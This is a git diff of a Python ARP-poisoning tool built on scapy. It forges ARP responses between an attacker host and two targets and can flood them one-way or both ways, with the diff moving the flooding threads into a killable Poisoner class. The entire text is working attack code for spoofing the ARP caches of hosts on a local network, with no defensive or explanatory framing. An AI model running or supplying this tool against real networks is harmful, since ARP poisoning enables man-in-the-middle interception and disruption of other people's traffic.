@@ -1,12 +1,10 @@
 import scapy.layers.l2
 from scapy.all import *
-from DataStructures import Host, StoppableThread
+from DataStructures import Host
+from threading import Thread
 
 
 class AttackTools:
-    thread1 = StoppableThread
-    thread2 = StoppableThread
-
     @staticmethod
     def build_arp_response(attacker: Host, target1: Host, target2: Host):
         # TODO: Add error detection
@@ -22,9 +20,8 @@ class AttackTools:
 
         return arp
 
-    @classmethod
-    def poison(cls, attacker: Host, target1: Host, target2: Host, bidirectional: bool, forwarding: bool, flood: bool):
-        # TODO: Add error detection
+    @staticmethod
+    def poison(attacker: Host, target1: Host, target2: Host, bidirectional: bool, flood: bool):
         arp1 = AttackTools.build_arp_response(attacker, target1, target2)
         if not flood:
             sendp(arp1)
@@ -35,29 +32,41 @@ class AttackTools:
                 sendp(arp2)
 
         if flood:
-            threads = []
-            print("Sending flood of ARP packets to selected targets...")
-            cls.thread1 = StoppableThread(target=AttackTools.sendp_flood, args=(arp1,))
-            threads.append(cls.thread1)
-            cls.thread1.start()
+            poisoners = [Poisoner(arp1)]
+            poisoners[0].poison()
 
         if flood and bidirectional:
-            cls.thread2 = StoppableThread(target=AttackTools.sendp_flood, args=(arp2,))
-            threads.append(cls.thread2)
-            cls.thread2.start()
+            poisoners.append(Poisoner(arp2))
+            poisoners[1].poison()
 
-        if forwarding:
-            # TODO: Implement packet forwarding
-            pass
+        if flood:
+            return poisoners
 
-        return threads
+
+class Poisoner:
+    def __init__(self, pkt):
+        self.thread = threading.Thread
+        self.killed = False
+        self.pkt = pkt
+
+    def poison(self):
+        self.thread = Thread(target=self.sendp_flood, args=(self.pkt,))
+        self.thread.start()
+
+    def is_killed(self):
+        return self.killed
+
+    def kill(self):
+        self.killed = True
+
+    def get_thread(self):
+        return self.thread
 
     # TODO: Convert from class method to instance method
-    @classmethod
-    def sendp_flood(cls, pkt):
+    def sendp_flood(self, pkt):
         while True:
             sendp(pkt, verbose=False)
-            if not cls.thread1.killed():
+            if self.is_killed():
                 break
 
     def packet_forwarder(self, attacker: Host, target1: Host, target2: Host, bidirectional: bool):
